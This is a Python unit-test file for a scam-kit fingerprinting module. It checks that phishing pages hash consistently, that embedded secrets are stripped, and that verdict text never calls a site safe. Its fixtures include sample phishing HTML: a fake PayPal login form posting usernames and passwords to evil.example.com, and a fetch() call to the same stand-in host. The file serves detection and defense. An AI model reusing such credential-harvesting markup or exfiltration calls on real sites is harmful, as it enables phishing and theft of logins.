#!/usr/bin/env python3
"""Unit tests for scam-kit fingerprinting (relayshield_scamkit).

The repo's first PAYG endpoint tests: everything here is pure
(normalization / hashing / confidence), so no network, no AWS, no boto3.

Run:  python3 test_scamkit_fingerprinting.py
"""

import sys
import unittest

sys.path.insert(0, "/tmp/rs")  # local dev; CI runs from the repo root
import relayshield_scamkit as sk


KIT_A = """<html><head><title>PayPal Login</title></head><body>
<form action="https://evil.example.com/collect" method="post">
<input type="text" name="user"><input type="password" name="pass">
<script>var apiKey = "sk-live-abc123XYZ789qrs"; fetch("https://evil.example.com/x?sid=AAA111");</script>
</form></body></html>"""

# Same kit as KIT_A, but a different victim: rotated session nonce and a
# rotated API credential. Must fingerprint IDENTICALLY.
KIT_A_ROTATED = (
    KIT_A.replace("AAA111", "ZZZ999").replace("sk-live-abc123XYZ789qrs", "sk-live-rotated000AAA111")
)

# Genuinely different kit: different exfil host, different structure.
KIT_B = """<html><head><title>Secure Bank</title></head><body>
<div class="login"><form action="https://other-bad.example.org/in" method="post">
<input type="email" name="email"></form></div>
<script>console.log("hello");</script>
</body></html>"""


class TestHashStability(unittest.TestCase):
    def test_same_kit_different_nonces_same_id(self):
        s_a = sk.extract_signals(KIT_A, "https://x.example.net/?sid=AAA")
        s_b = sk.extract_signals(KIT_A_ROTATED, "https://x.example.net/?sid=ZZZ")
        self.assertEqual(sk.fingerprint_id(s_a), sk.fingerprint_id(s_b))

    def test_different_kits_different_ids(self):
        s_a = sk.extract_signals(KIT_A)
        s_b = sk.extract_signals(KIT_B)
        self.assertNotEqual(sk.fingerprint_id(s_a), sk.fingerprint_id(s_b))

    def test_id_shape(self):
        fid = sk.fingerprint_id(sk.extract_signals(KIT_A))
        self.assertTrue(fid.startswith("kit_"))
        self.assertTrue(sk.valid_fingerprint_id(fid))
        self.assertFalse(sk.valid_fingerprint_id("kit_zzz"))
        self.assertFalse(sk.valid_fingerprint_id(""))

    def test_normalize_is_deterministic(self):
        self.assertEqual(sk.normalize_html(KIT_A), sk.normalize_html(KIT_A))


class TestSecretStripping(unittest.TestCase):
    def test_credential_rotation_does_not_change_id(self):
        # The whole point: rotated secrets must not perturb the fingerprint.
        s_a = sk.extract_signals(KIT_A)
        s_b = sk.extract_signals(KIT_A_ROTATED)
        self.assertEqual(s_a, s_b)

    def test_secrets_never_appear_in_signals(self):
        blob = (
            'aws_key=AKIAIOSFODNN7EXAMPLE secret="hunter2-hunter2" '
            "bearer Bearer abcdefghijklmnop1234 "
            "uuid 123e4567-e89b-12d3-a456-426614174000 "
            "mac 00:1A:2B:3C:4D:5E victim@target.com"
        )
        signals = sk.extract_signals(f"<html><body><script>var x='{blob}';</script></body></html>")
        dumped = str(signals)
        for secret in ("AKIAIOSFODNN7EXAMPLE", "hunter2", "123e4567-e89b",
                       "00:1A:2B:3C:4D:5E", "victim@target.com", "abcdefghijklmnop1234"):
            self.assertNotIn(secret, dumped, f"secret leaked into signals: {secret}")

    def test_strip_secrets_idempotent(self):
        once = sk.strip_secrets(KIT_A)
        self.assertEqual(once, sk.strip_secrets(once))


class TestConfidenceBands(unittest.TestCase):
    def test_exact_band(self):
        conf, verdict = sk.compute_confidence(exact_sightings=2)
        self.assertGreaterEqual(conf, 0.90)
        self.assertEqual(verdict, "known_kit")
        self.assertEqual(sk.confidence_band(0.90), "exact")
        self.assertEqual(sk.confidence_band(1.00), "exact")

    def test_likely_variant_band(self):
        conf, verdict = sk.compute_confidence(overlap_fraction=0.60)
        self.assertGreaterEqual(conf, 0.60)
        self.assertLess(conf, 0.90)
        self.assertEqual(verdict, "likely_variant")
        self.assertEqual(sk.confidence_band(0.60), "likely_variant")
        self.assertEqual(sk.confidence_band(0.89), "likely_variant")

    def test_weak_band(self):
        conf, verdict = sk.compute_confidence(overlap_fraction=0.30)
        self.assertGreaterEqual(conf, 0.30)
        self.assertLess(conf, 0.60)
        self.assertEqual(sk.confidence_band(0.30), "weak")
        self.assertEqual(sk.confidence_band(0.59), "weak")

    def test_unknown_band(self):
        conf, verdict = sk.compute_confidence()
        self.assertLess(conf, 0.30)
        self.assertEqual(verdict, "unknown")
        self.assertEqual(sk.confidence_band(0.29), "unknown")
        self.assertEqual(sk.confidence_band(0.0), "unknown")


class TestVerdictCopy(unittest.TestCase):
    BANNED = ("safe", "clean", "legitimate", "trustworthy", "benign")

    def test_unknown_never_says_safe(self):
        import re
        copy = sk.verdict_copy("unknown")
        lowered = copy.lower()
        for word in self.BANNED:
            # Whole-word match: "safety" in the mandated caveat is fine,
            # a bare "safe" verdict is not.
            self.assertIsNone(re.search(rf"\b{word}\b", lowered),
                              f"banned word '{word}' in unknown copy")
        self.assertIn("not a guarantee of safety", copy)

    def test_all_verdicts_avoid_banned_words(self):
        copies = [
            sk.verdict_copy("unknown"),
            sk.verdict_copy("likely_variant", family="parcel-smish-eu-04", shared=5, total=9),
            sk.verdict_copy("likely_variant"),
            sk.verdict_copy("known_kit", family="parcel-smish-eu-04", sightings=7),
        ]
        for copy in copies:
            for word in self.BANNED:
                # "safety" contains "safe" as a substring — check whole words.
                import re
                self.assertIsNone(
                    re.search(rf"\b{word}\b", copy.lower()),
                    f"banned word '{word}' in verdict copy: {copy}",
                )

    def test_known_kit_copy_names_family(self):
        copy = sk.verdict_copy("known_kit", family="parcel-smish-eu-04", sightings=7)
        self.assertIn("parcel-smish-eu-04", copy)
        self.assertIn("7 sightings", copy)


class TestFamilySuggest(unittest.TestCase):
    def test_suggest_returns_suggested_never_approved(self):
        s_a = sk.extract_signals(KIT_A)
        s_b = sk.extract_signals(KIT_A_ROTATED)
        fams = [{"family": "parcel-smish-eu-04", "signals": s_a}]
        family, status = sk.suggest_family(s_b, fams)
        self.assertEqual(family, "parcel-smish-eu-04")
        self.assertEqual(status, "suggested")
        self.assertNotEqual(status, "approved")

    def test_no_match_returns_none(self):
        s_b = sk.extract_signals(KIT_B)
        fams = [{"family": "parcel-smish-eu-04", "signals": sk.extract_signals(KIT_A)}]
        self.assertEqual(sk.suggest_family(s_b, fams), (None, None))


if __name__ == "__main__":
    unittest.main(verbosity=2)
